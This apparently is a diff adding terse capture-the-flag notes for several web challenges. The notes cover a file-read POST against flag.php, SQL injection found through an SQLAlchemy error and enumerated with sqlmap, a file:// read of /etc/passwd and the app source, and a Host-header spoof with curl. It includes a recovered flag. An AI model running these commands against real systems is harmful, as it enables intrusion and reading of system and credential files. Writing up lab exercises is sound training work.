@@ -1,0 +1,26 @@
+curl -X POST "URL/?start" -d "start=/var/www/html/flag.php"
+
+Accessed the web application at http://34.185.184.46:30787/
+Observed two input fields for user interaction
+Noticed one field (user ID parameter) appeared to lack proper validation
+Tested the /user?id= endpoint by submitting an empty value
+Application crashed and returned a detailed SQLAlchemy error message:
+Python-based application using SQLAlchemy ORM
+Critical information obtained:
+Backend: PostgreSQL database
+Technology: Python with SQLAlchemy ORM
+Vulnerability: User input inserted directly into SQL query without validation
+Database schema: Table named 'guests' exists
+SQLMap confirmed SQL injection vulnerability and identified PostgreSQL backend
+sqlmap -u 'http://34.185.184.46:30787/user?id=1' -D public --tables
+Targeted the 'public' schema (PostgreSQL's default schema for user tables)
+Retrieved all table names in the database:
+Results:
+alembic_version (migration tracking)
+guests (application data)
+ctf{57b23475b9b02093a9eb5d7df5f07957e2b2dc724443d6b08961fbe3387}
+
+Tried file:///etc/passwd → worked, found /home/ctf user
+Tried file:///home/ctf/app.py → got Python source code
+Code showed: If Host header = "company.tld" → flag reveals
+curl -H "Host: company.tld" http://34.89.248.39:30385/
